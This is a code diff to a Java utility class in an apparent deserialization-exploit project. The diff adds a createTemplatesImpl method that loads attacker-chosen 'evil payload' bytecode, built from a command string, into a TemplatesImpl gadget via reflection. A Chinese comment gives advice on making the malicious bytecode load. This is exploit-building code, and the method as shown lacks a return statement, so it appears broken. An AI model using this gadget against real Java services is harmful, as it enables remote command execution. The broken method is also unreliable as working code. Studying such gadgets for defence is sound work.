@@ -1,5 +1,7 @@
 package Seri;
 
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
@@ -8,6 +10,8 @@ import sun.reflect.ReflectionFactory;
 import java.io.*;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.Base64;
 
 public class Utils {
@@ -37,6 +41,15 @@ public class Utils {
         Field field = obj.getClass().getDeclaredField(name);
         field.setAccessible(true);
         field.set(obj, value);
+    }
+
+    public static TemplatesImpl createTemplatesImpl(String cmd) throws Exception {
+        TemplatesImpl templates = new TemplatesImpl();
+        byte[] bytes = Utils.getEvilPayload(cmd);
+        setValue(templates,"_name","aaa");
+        // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
+        setValue(templates,"_bytecodes",new byte[][]{bytes});
+        setValue(templates,"_tfactory",new TransformerFactoryImpl());
     }
 
     public static byte[] getEvilPayload(String cmd) throws Exception {
